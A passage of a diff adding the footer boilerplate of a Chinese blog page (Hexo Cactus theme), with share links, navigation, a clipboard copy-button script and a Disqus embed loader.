+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&t=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2018.12.8-2020
+    steady
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+</body>
+</html>
